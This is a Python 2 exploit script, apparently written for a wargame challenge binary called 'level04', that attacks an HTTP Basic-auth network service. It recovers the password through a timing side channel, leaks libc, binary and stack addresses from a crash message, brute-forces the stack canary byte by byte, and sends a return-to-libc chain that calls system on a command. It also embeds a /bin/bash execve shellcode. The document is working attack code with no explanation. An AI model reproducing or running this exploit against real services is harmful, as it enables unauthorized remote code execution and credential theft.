from socket import *
import sys, struct
import string, base64, time

SHELLCODE = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70"
             "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61"
             "\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52"
             "\x51\x53\x89\xe1\xcd\x80")

COMMAND = 'id\0'

PW_SET = string.ascii_lowercase + string.ascii_uppercase + string.digits
JUNK = 'A' * (2048 - 17)

LIBC_SYSTEM = 0x3cb20
LIBC_READ = 0xc1240
BASE_CLEAN_C = 0x22B6
BASE_CLEAN_4 = 0x22B8

class Exploit(object):
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.pw = None
        self.canary = None

        self.libc = None
        self.base = None
        self.stack = None

    def validate_credentials(self, pw, recv_all = False):
        pw = ':' + pw
        pw = base64.b64encode(pw)
        s = create_connection((self.ip, self.port))
        t0 = time.time()
        s.send('GET / HTTP/1.1\r\n')
        s.send('Authorization: Basic ' + pw + '\r\n')
        s.send('\r\n' + COMMAND)
        data = s.recv(2048)
        t = time.time() - t0
        if recv_all:
            while True:
                try:
                    buf = s.recv(2048)
                    if buf == '':
                        break
                    data += buf
                except error:
                    break
        s.close()
        return t, data

    def reveal_password(self):
        res = ''
        while True:
            for i in xrange(16):
                min_c = min_t = None
                for c in PW_SET:
                    while True:
                        try:
                            t = self.validate_credentials(res + c)[0]
                            break
                        except error:
                            pass

                    if min_t is None or t < min_t:
                        min_t, min_c = t, c
                        continue
                res += min_c

            test_response = self.validate_credentials(res)[1]
            if test_response.startswith('HTTP/1.0 200 Ok'):
                break

        self.pw = res
        return res

    def break_pie(self):
        'Analyze stack check crash message.'
        raw_crash = self.validate_credentials(self.pw + JUNK + 'BBBB', True)[1]
        for line in raw_crash.splitlines():
            if line.endswith('/libc-2.13.so') and self.libc is None:
                libc = line.split('-', 1)[0]
                libc = int(libc, 16)
                self.libc = libc
            elif line.endswith('/level04') and self.base is None:
                base = line.split('-', 1)[0]
                base = int(base, 16)
                self.base = base
            elif line.endswith('[stack]') and self.stack is None:
                stack = line.split('-', 1)[0]
                stack = int(stack, 16)
                self.stack = stack

    def find_canary(self):
        canary = ''
        while len(canary) < 4:
            for i in xrange(256):
                data = self.validate_credentials(self.pw + JUNK + canary + chr(i), True)[1]
                if data.startswith('HTTP/1.0 200 Ok'):
                    canary += chr(i)
                    break
            else:
                raise Exception('canary not found (%r)' % canary.encode('hex'))

        self.canary = canary
        return canary

    def send_payload(self):
        payload = self.pw + JUNK + self.canary + 'B' * 28

        # read 2 bytes of CRLF first
        payload += struct.pack('<L', self.libc + LIBC_READ)
        payload += struct.pack('<L', self.base + BASE_CLEAN_C)
        payload += struct.pack('<L', 0)
        payload += struct.pack('<L', self.stack)
        payload += struct.pack('<L', 2)

        payload += struct.pack('<L', self.libc + LIBC_READ)
        payload += struct.pack('<L', self.base + BASE_CLEAN_C)
        payload += struct.pack('<L', 0)
        payload += struct.pack('<L', self.stack)
        payload += struct.pack('<L', len(COMMAND))

        payload += struct.pack('<L', self.libc + LIBC_SYSTEM)
        payload += struct.pack('<L', self.base + BASE_CLEAN_4)
        payload += struct.pack('<L', self.stack)

        print self.validate_credentials(payload, True)[1]

def main():
    ip = sys.argv[1]
    port = int(sys.argv[2])

    exploit = Exploit(ip, port)
    exploit.reveal_password()
    exploit.break_pie()
    exploit.find_canary()

    print 'password:', exploit.pw
    print 'libc:', hex(exploit.libc)
    print 'module base:', hex(exploit.base)
    print 'stack start:', hex(exploit.stack)
    print 'canary:', exploit.canary.encode('hex')

    exploit.send_payload()

if '__main__' == __name__:
    main()

